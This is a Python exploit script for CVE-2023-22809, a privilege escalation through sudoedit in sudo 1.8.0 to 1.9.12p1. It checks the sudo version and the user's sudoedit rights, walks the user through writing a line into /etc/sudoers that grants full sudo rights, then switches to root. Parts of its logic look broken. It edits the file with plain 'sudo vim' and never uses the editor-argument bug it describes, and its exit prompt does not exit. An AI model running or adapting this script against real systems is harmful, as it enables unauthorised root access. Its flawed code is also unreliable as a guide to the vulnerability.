# Arthur: D0rDa4aN919
# CVE: CVE-2023-22809
# Language: Python
# Vulnerable product: sudo
# Versions: 1.8.0 through 1.9.12.p1
# Description: The scrip used to exploit the CVE-2023-22809. The vulnerability was found in sudo version 1.8.0 through 1.9.12.p1 using the sudoedit or sudo -e permission to edit the sudoers file.
# License:
"""
MIT License

Copyright (c) 2024 D0rDa4aN919

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

#!/usr/bin/env python3
import subprocess, sys, platform, random, argparse

# Version of the sudo
cve="CVE-2023-22809"
# Version of the sudo
VERSIONS = ['1.8', '1.9.0', '1.9.1', '1.9.2', '1.9.3', '1.9.12p1']
# Coloring rule
colors = {
    'Red': '\033[0;31m',
    'Green': '\033[0;32m',
    'Yellow': '\033[0;33m',
    'Blue': '\033[0;34m',
    'Magenta': '\033[0;35m',
    'Cyan': '\033[0;36m',
    'Reset': '\033[0m'
}


def logo() -> str:
    """
    Choose random color for the logo, and creating colored stirng
    :return: Logo string
    """
    color = random.choice(list(colors.keys())[0:-1:1])
    return f'''{colors[color]}
    \r·······················································································
    \r:                                                                                     :
    \r:                                                                                     :
    \r:     (                        )    )     )     )         )    )  (         )     )   :
    \r:     )\\   (   (   (        ( /( ( /(  ( /(  ( /(      ( /( ( /(  )\\ (   ( /(  ( /(   :
    \r:   (((_)  )\\  )\\  )\\  ___  )(_)))\\()) )(_)) )\\())___  )(_)))(_))((_))\\  )\\()) )\\())  :
    \r:   )\\___ ((_)((_)((_)|___|((_) ((_)\\ ((_)  ((_)\\|___|((_) ((_)    _((_)((_)\\ ((_)\\   :
    \r:  ((/ __|\\ \\ / / | __|    |_  )/  (_)|_  )|__ (_)    |_  )|_  )  ( _ ) /  (_)/ _(_)  :
    \r:   | (__  \\ V /  | _|      / /| () |  / /  |_ \\       / /  / /   / _ \\| () | \\_, /   :
    \r:    \\___|  \\_/   |___|    /___|\\__/  /___||___/      /___|/___|  \\___/ \\__/   /_/    :
    \r:                          ###### By D0rDa4aN919 ######                               :
    \r:                                                                                     :
    \r:                                                                                     :
    \r·······················································································{colors["Reset"]}'''


def check_sudo_version() -> bool:
    """
    Check if the sudo version is supported
    :return: Boolean
    """
    try:
        sudo_version_line = subprocess.check_output(['sudo', '--version'], text=True).splitlines()[0]
        if any(version in sudo_version_line for version in VERSIONS):
            return True
        else:
            return False
    except subprocess.CalledProcessError:
        return False


def check_exploitable_permissions() -> bool:
    """
    Check the sudo permission for the CVE to work.
    :return: Boolean
    """
    try:
        sudo_list = subprocess.check_output(['sudo', '-l'], text=True).splitlines()
        for line in sudo_list:
            if 'sudoedit' in line or 'sudo -e' in line:
                if '(root)' in line or '(ALL)' in line or '(ALL : ALL)' in line:
                    return True
        return False
    except subprocess.CalledProcessError:
        return False


def executeCommand(command: list, err: str) -> None:
    """
    Execute the commands
    :param command: Command list to execute
    :param err: Error message if failed
    :return: None
    """
    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError:
        print(err)
        sys.exit(3)


def infoPrint() -> str:
    """
    Print the information for the CVE to be exploited
    :return: CVE information string
    """
    color = random.choice(list(colors.keys())[0:-1:1])
    return f"""{colors[color]}
    \r[*] In Sudo before 1.9.12p2, the sudoedit (aka -e) feature mishandles extra arguments passed in the user-provided environment variables (SUDO_EDITOR, VISUAL, and EDITOR), allowing a local attacker to append arbitrary entries to the list of files to process. This can lead to privilege escalation. Affected versions are 1.8.0 through 1.9.12.p1. The problem exists because a user-specified editor may contain a "--" argument that defeats a protection mechanism, e.g., an EDITOR='vim -- /path/to/extra/file' value.
    {colors['Reset']}"""


def requirementsPrint() -> str:
    """
    Print the requirements for the CVE to be exploited
    :return: Requirements string
    """
    color = random.choice(list(colors.keys())[0:-1:1])
    return f"""{colors[color]}
    \r[*] For exploit the vulnerability of {cve} the user need to have requirements with sudo command:
    \r\t[*] 1) For this script to run it will require python3, but you know that if you see this message.
    \r\t[*] 2) This CVE need to be execute in the target machine, Linux-Based.
    \r\t[*] 3) The current user must have the ability to run sudoedit or sudo -e on files as root.
    \r\t[*] 4) The sudo group need to be in the next versions: {','.join(VERSIONS)}.
    {colors['Reset']}"""


def OSCheck() -> None:
    """
    Check the OS supported
    :return: None
    """
    plat = platform.system()
    if plat.lower() == "linux":
        print(f"{colors['Green']}[*] Supported OS...{colors['Reset']}")
    else:
        print(f"{colors['Red']}[*] Not supported OS...{colors['Reset']}")
        sys.exit(3)


def systemChecks(args) -> None:
    """
    Preform pre requirements for the script to work, and if not match, it will exit...
    :param args: The CLI arguments
    :return: None
    """
    OSCheck()
    if args.info:
        print(infoPrint())
        sys.exit(0)
    if args.requirements:
        print(requirementsPrint())
        sys.exit(0)
    if not check_sudo_version():
        print(f"{colors['Red']}[*] The current Sudo version isn't vulnerable to {cve}...{colors['Reset']}")
        sys.exit(1)
    else:
        print(f"{colors['Green']}[*] The current Sudo version is vulnerable to {cve}...{colors['Reset']}")

    if not check_exploitable_permissions():
        print(f"{colors['Red']}[*] It doesn't seem that this user can run sudoedit as root{colors['Reset']}")
        sys.exit(1)
    else:
        print(f"{colors['Green']}[*] This user can run sudoedit as root{colors['Reset']}")


def main() -> None:
    """
    Main CVE-2023-22809 exploiter
    :return: None
    """
    # Argument parser
    parser = argparse.ArgumentParser(prog=f'{cve} Exploiter',description=f"Used to exploit the {cve} privileges escalation using sudo 1.8.0 through 1.9.12.p1 versions.", add_help=True)
    parser.add_argument(
        "-i", "--info",
        action="store_true",
        help=f"Show information about {cve}.",
        default=False
    )
    parser.add_argument(
        "-r", "--requirements",
        action="store_true",
        help=f"Requeriments for {cve} to work.",
        default=False
    )
    args = parser.parse_args()

    # Execution start
    print(f"{logo()}")
    systemChecks(args)

    # User Interaction
    print(f"""
          {colors['Blue']}\r[*] For the attack, the sudoers file will be opened, use the next steps to continue:
          {colors['Magenta']}\r[*] \t1) Insert mode to write in vim:
          \r[*] \tEsc
          \r[*] \t:i
          \r[*] \t2)Enter the next string into the sudoers file: 
          \r[*] \t{subprocess.check_output(['whoami'], text=True).strip()} ALL=(ALL:ALL) ALL
          \r[*] \t3) Over write the sudoers file:
          \r[*] \tEsc
          \r[*] \t:wq!{colors['Reset']}""")
    m = input(f"{colors['Blue']}[*] Press Enter to continue or N to exit: {colors['Reset']}")
    if m.lower().startswith("n"):
        print(f"{colors['Red']}[*] Exiting...{colors['Reset']}")
    executeCommand(command=['sudo', 'vim', '--', '/etc/sudoers'], err="Error opening the sudoers file with vim")

    # Exploitation
    executeCommand(command=['sudo', 'su', 'root'], err="Error switching to root")

    # Finish successfully
    print(f"{colors['Green']}[*] Exploit execute successfully...{colors['Reset']}")


if __name__ == "__main__":
    # Start script.
    main()
    # Exiting
    sys.exit(0)
